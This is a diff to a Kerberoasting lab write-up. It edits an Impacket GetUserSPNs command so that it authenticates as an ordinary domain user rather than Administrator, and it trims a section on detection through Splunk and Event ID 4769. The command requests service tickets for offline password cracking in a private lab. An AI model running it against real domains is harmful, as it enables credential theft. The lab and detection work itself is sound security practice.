@@ -17,9 +17,9 @@ Kerberoasting is an Active Directory attack technique (MITRE ATT&CK T1558.003) w
 ## Attack Steps
 
 ### 1. Discovered Kerberoastable Accounts
-Used Impacket's GetUserSPNs to find service accounts with SPNs:
+Used Impacket's GetUserSPNs, authenticating as a regular domain user (`swetha`) — not an admin — to prove the attack requires no elevated privileges:
 ```bash
-impacket-GetUserSPNs lab.local/Administrator:Password -dc-ip 192.168.56.10 -request -outputfile hash.txt
+impacket-GetUserSPNs lab.local/swetha:password -dc-ip 192.168.56.10 -request -outputfile hash.txt
 ```
 Result: Found svc-sql with SPN MSSQLSvc/lab.local:1433
 
@@ -65,6 +65,4 @@ If this were a real company:
 - Forward Windows Security logs to Splunk
 - Write detection query for Event ID 4769 (Kerberoasting indicator)
 - Verify alert fires when attack is repeated
-
-  
 
